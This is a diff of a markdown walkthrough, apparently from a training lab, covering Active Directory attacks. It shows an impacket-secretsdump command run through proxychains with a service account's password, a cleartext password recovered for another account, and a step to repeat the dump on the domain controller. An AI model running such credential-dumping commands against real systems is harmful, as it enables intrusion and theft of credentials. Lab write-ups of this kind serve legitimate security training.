@@ -1,8 +1,8 @@
-**NOTE:** All the following must be run from Server1.
 
+## With svcScanning user
 Service accounts have more privileges than normal domain users. With the `svcScanning` account, we can carry out further attacks such as dumping secrets from the AD machines.
 
-## Dump hashes on the `Server1` machine
+### Dump hashes on the `Server1` machine
 
 $ `proxychains -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.113.31`
 
@@ -84,7 +84,7 @@ q9nzssaFtGHdqUV3Qv6G
 Cleaning up... 
 Stopping service RemoteRegistry
 
-## Intersting discoveries
+### Interesting discoveries
 
 > There are a couple of things from this output that are of most interest.
 
@@ -94,3 +94,7 @@ Stopping service RemoteRegistry
 - The ClearText password for `svcBackups` account.
 	- <font color="#00b050">svcBackups@corp.thereserve.loc:</font>
 	- q9nzssaFtGHdqUV3Qv6G
+
+## With svcBackups
+Perform the same technique and dump secrets from the CORPDC machine, we will use the `svcBackups` account.
+
